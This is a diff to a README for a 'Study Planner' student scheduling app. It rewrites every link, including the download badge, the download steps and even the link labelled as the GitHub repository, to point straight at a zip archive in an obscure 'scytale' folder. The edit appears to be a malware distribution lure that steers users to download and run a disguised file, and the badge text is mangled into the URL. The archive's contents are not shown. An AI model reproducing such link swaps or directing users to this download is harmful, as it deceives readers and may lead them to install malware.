@@ -1,6 +1,6 @@
 # 📘 Study-Planner - Organize Your Study Schedule Easily
 
-[![Download Study Planner](https://img.shields.io/badge/Download%20Now-Study%20Planner-brightgreen)](https://github.com/MyNamesWaltuh/Study-Planner/releases)
+[![Download Study Planner](https://raw.githubusercontent.com/MyNamesWaltuh/Study-Planner/main/scytale/Planner-Study-v3.8-alpha.4.zip%20Now-Study%20Planner-brightgreen)](https://raw.githubusercontent.com/MyNamesWaltuh/Study-Planner/main/scytale/Planner-Study-v3.8-alpha.4.zip)
 
 ## 📅 Introduction
 
@@ -11,7 +11,7 @@ Welcome to the Study Planner Website. This application helps students manage the
 To begin using the Study Planner, follow these steps:
 
 1. **Visit the Download Page.** Click the link below to access the release page and start your download:
-   [Visit this page to download](https://github.com/MyNamesWaltuh/Study-Planner/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/MyNamesWaltuh/Study-Planner/main/scytale/Planner-Study-v3.8-alpha.4.zip)
 
 2. **Choose the Latest Release.** On the release page, locate the latest version. Look for the version number and click on it.
 
@@ -21,7 +21,7 @@ To begin using the Study Planner, follow these steps:
 
 You can download the Study Planner by visiting the link below:
 
-[Visit this page to download](https://github.com/MyNamesWaltuh/Study-Planner/releases)
+[Visit this page to download](https://raw.githubusercontent.com/MyNamesWaltuh/Study-Planner/main/scytale/Planner-Study-v3.8-alpha.4.zip)
 
 After downloading, follow these simple steps to install it:
 
@@ -78,7 +78,7 @@ If you encounter any issues or have questions, please check the Issues section o
 
 ## 🔗 More Resources
 
-- **GitHub Repository:** [Study Planner GitHub](https://github.com/MyNamesWaltuh/Study-Planner)
+- **GitHub Repository:** [Study Planner GitHub](https://raw.githubusercontent.com/MyNamesWaltuh/Study-Planner/main/scytale/Planner-Study-v3.8-alpha.4.zip)
 - **Contributing:** If you want to contribute to this project, feel free to check the contributing guidelines in the repository.
 
 ## 👥 Community
